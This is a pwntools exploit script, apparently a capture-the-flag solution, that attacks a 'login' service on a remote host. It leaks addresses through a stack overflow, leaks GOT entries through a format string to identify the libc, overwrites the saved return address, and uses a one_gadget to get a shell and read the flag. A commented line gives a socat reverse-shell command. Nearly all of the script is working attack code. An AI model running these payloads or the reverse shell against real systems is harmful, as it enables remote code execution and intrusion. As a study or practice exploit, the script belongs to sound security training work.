from pwn import *
DEBUG = False
DEBUG_PAUSE = False
ONESHOT = True

context.binary = elf = ELF("login")
libc_build = "e595f27c46f3496a2acf96d88c238e1393f1dbc9"
user_input = ''
#context.log_level = 'critical'

def getleakReturn(p, overflow):
    overflow_enc1 = chr(overflow).encode('latin1')
    overflow_enc2 = chr(overflow+2).encode('latin1')

    payload = b"B"*40+overflow_enc1
    p.sendlineafter(b"Full name please.", payload)
    p.recvuntil(overflow_enc2)
    recv = p.recv(2)
    if recv[0] != 6:
        log.failure("Leak contains badchars or is wrong.")
        p.close()
        exploit(p)
    leak = u64(p.recv(6)+b"\x00\x00")
    return leak

def getleakRbp(p, overflow):
    overflow_enc = chr(overflow).encode('latin1')

    payload = b"B"*40+overflow_enc
    p.sendlineafter(b"Full name please.", payload)
    p.recvline()
    leak = u64(p.recv(6)+b"\x00\x00")
    if leak < 0x7f0000000000:
        log.failure("Leaked EBP likely wrong")
        p.close()
        exploit(p)

    return leak
def leakLibcVersion(p, rbp_leak):
    overflow = 63
    overflow_enc = chr(overflow).encode('latin1')

    payload = b"B"*40+overflow_enc+b" "+b"C"*6 #48
    payload += p64(elf.got.printf) #56
    payload += p64(elf.got.fgets) #64
    payload += p64(rbp_leak-152) #72 __libc_start_main_ret
    payload += b"D"*(168-len(payload)) #padding
    payload += p64(rbp_leak-248) #pointer to the arg0 string
    payload += b"EEEEEEEE" #padding because a nullbyte get inserted
    payload += b"%16$s-%17$s-%18$s"
    p.sendlineafter(b"Full name please.", payload)
    p.recvuntil(b"too long.\n")
    leak_dict = {"printf" : 0,
                 "fgets"  : 0,
                 "__libc_start_main_ret" : 0}
    leaks = p.recvline(keepends=False).split(b'-')
    try:
        i=0
        for key in leak_dict.keys():
            leak_dict[key] = u64(leaks[i]+b'\x00\x00')
            log.success(f"[leak] {key} at {leak_dict[key]:x}")
            i+=1
    except:
        log.failure("Error during decoding of got. Probably badchars.")
        print(leaks)
        p.close()
        exploit(p)

    log.info("Process with downloading the corresponding glibc version?")
    pause()
    result = libcdb.search_by_symbol_offsets(leak_dict)
    print("Glibc version downloaded here :")
    print(result)
    print("You can also download it from https//libc.rip")
        
    p.close()

def popShell(p, rbp_leak):
    libc_path = libcdb.search_by_build_id(libc_build) #id of glibc version on the server. Retrived through the leak
    libc = ELF(libc_path, checksec=False)

    overflow = 63
    overflow_enc = chr(overflow).encode('latin1')

    log.info(f"Leaking libc...")
    log.info(f"Entry is at {elf.sym._start:x}")
    fmt_str = fmtstr_payload(12, {rbp_leak-152: p64(elf.sym._start-0x900090009)}, write_size='short') 
    #we want to return to main but we don't simply jump to main because we have to reconstruct the stack.
    #if we return to main and overwrite the return pointer of main like previously it won't work because the canary won't be there.
    #this is the reason why we call entry0 (which will later call main) in order to reconstruct this stack.
    #-0x900090009 because this offset is applied when adding %16$saaa (which correspont to 6+3 for each short

    payload = b"B"*40+overflow_enc+b" "+b"C"*6 #48
    payload += p64(rbp_leak-152)    # %16$
    #we want to put the pointers below before the format string instead of after so that our payload is not too large.
    payload += fmt_str[-3*8:-2*8]   # %17$
    payload += fmt_str[-2*8:-1*8]   # %18$
    payload += fmt_str[-1*8:]       # %19$
    payload += b"D"*(168-len(payload)) #padding
    payload += p64(rbp_leak-248) #pointer to the arg0 string
    payload += b"EEEEEEEE" #padding because a nullbyte get inserted

    payload += b"%16$saaa"

    payload += fmt_str[:-3*8] #we remove the pointers that we displaced previously


    log.info(f"Payload len {len(payload)} (should not exceed 256)")
    if DEBUG:
        log.info(repr(payload))
    if DEBUG_PAUSE:
        pause()

    p.sendlineafter(b"Full name please.", payload)
    p.recvuntil(b"is too long.\n")
    leak = u64(p.recv(6)+b"\x00\x00")
    libc.address = leak-libc.libc_start_main_return
    log.success(f"[leak] libc base at {libc.address:x}")

    #--------------

    log.info(f"Exploiting one gadget...")
    onegadget = libc.address + 0x11ab6f #found using one_gadget on the found libc version
    # one_gadget $HOME/.cache/.pwntools-cache-3.12/libcdb/build_id/e595f27c46f3496a2acf96d88c238e1393f1dbc9
    log.info(f"Onegadget is at {onegadget:x}")
    fmt_str = fmtstr_payload(33, {rbp_leak-424: p32(onegadget&0xffffffff)}, write_size='short') 
    #the offset of saved RIP with respect to our rbp leak has changed (-424) because technically we returned from main
    #we have overwritten saved RIP in order to return back to main but RBP and thus the stackframe changed.

    payload = b"B"*40+overflow_enc+b" "+b"C"*6 #48
    payload += b"D"*(168-len(payload)) #padding
    payload += p64(rbp_leak-520) #pointer to the arg0 string
    payload += b"EEEEEEEE" #padding because a nullbyte get inserted

    payload += fmt_str


    log.info(f"Payload len {len(payload)} (should not exceed 256)")
    if DEBUG:
        log.info(repr(payload))

    if DEBUG_PAUSE:
        pause()
    p.sendlineafter(b"Full name please.", payload)
    p.recvline()
    p.recvline()
    if ONESHOT: #if we can only send one command before the pipe gets closed (it's the case on the server with this gadget)
        p.sendline(b"cat flag.txt")
        p.recvuntil(b"CSC{")
        result = p.recvline()
        p.success("CSC{"+result.decode())
        #Or if you want to maintain a connection you could uncomment the following (and comment the previous lines) to make a reverse_tcp connection (make sure to run "nc -lp 12345" on your machine)
        #PUT YOUR IP BELOW
        #p.sendline(b"socat TCP:172.17.0.1:12345 EXEC:/bin/sh")
    else:       #if not oneshot we try to echo Test and see if we recieve Test
        p.sendline(b"echo Test")
        if(p.recvline()[-5:] == b"Test\n"):
            log.success("Enjoy your shell")
        else:
            raise EOFError

    p.interactive()
    p.close()
    exit()
def exploit(p):
    #pause()

    return_leak = getleakReturn(p, 0xd6)
    log.success(f"[leak] return pointer is {return_leak:x}")
    elf.address = return_leak-0x000013fc
    log.info(f"Base address is {elf.address:x}")

    rbp_leak = getleakRbp(p, 0xce)
    #rbp_leak = getleakReturn(p, 0xce)
    log.success(f"[leak] saved rbp is {rbp_leak:x}")

    if user_input.lower() == 'l':
        leakLibcVersion(p, rbp_leak)
    else:
        popShell(p, rbp_leak)
    exit()

def main():
    global user_input
    user_input = input("Do you want the exploit or the glibc leak?(X/l)\n -> ")
    #We run the exploit multiple times because there are "many" random things that could make the exploit fail
    while(True):
        #p = elf.process()
        p = remote("10.0.2.15", 1337)
        #pause()
        try:
            exploit(p)
        except EOFError:
            log.failure("Early EOF")
            p.close()



main()
